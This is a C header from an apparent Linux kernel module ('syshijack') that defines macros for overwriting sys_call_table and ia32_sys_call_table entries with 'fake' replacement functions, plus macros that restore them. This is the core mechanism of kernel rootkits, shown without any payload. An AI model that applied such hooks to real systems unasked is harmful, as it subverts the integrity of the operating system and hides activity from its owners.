#ifndef HOOKFNS_H_INCLUDED
#define HOOKFNS_H_INCLUDED

#include "syshijack.h"

/*****************************************************************************\
| HOOK MACROS                                                                 |
| F, RF and FF stand for:                                                     |
| F = FUNCTION as defined in include/linux/syscalls.h                         |
| RF = REAL FUNCTION as in the function in which we will save F               |
| FF = FAKE FUNCTION as in the function which we'll be using to fake F        |
\*****************************************************************************/

#define HOOK(F, RF, FF)                       \
DEBUG(KERN_INFO "HOOKING " #F "\n");          \
RF = (void *)sys_call_table[F];               \
sys_call_table[F] = (void *)FF;               \
REGISTER(F);

#ifdef CONFIG_IA32_EMULATION
#define HOOK_IA32(F, RF, FF)                  \
DEBUG(KERN_INFO "HOOKING_IA32 " #F "\n");     \
RF = (void *)ia32_sys_call_table[F];          \
ia32_sys_call_table[F] = (void *)FF;          \
REGISTER(F);
#endif

#define UNHOOK(F, RF)                         \
DEBUG(KERN_INFO "UNHOOKING " #F "\n");        \
sys_call_table[F] = (void *)RF;

#ifdef CONFIG_IA32_EMULATION
#define UNHOOK_IA32(F, RF)                    \
DEBUG(KERN_INFO "UNHOOKING_IA32 " #F "\n");   \
ia32_sys_call_table[F] = (void *)RF;
#endif

/*****************************************************************************\
|                                      END                                    |
\*****************************************************************************/

void hook_calls(void);
void unhook_calls(void);

#endif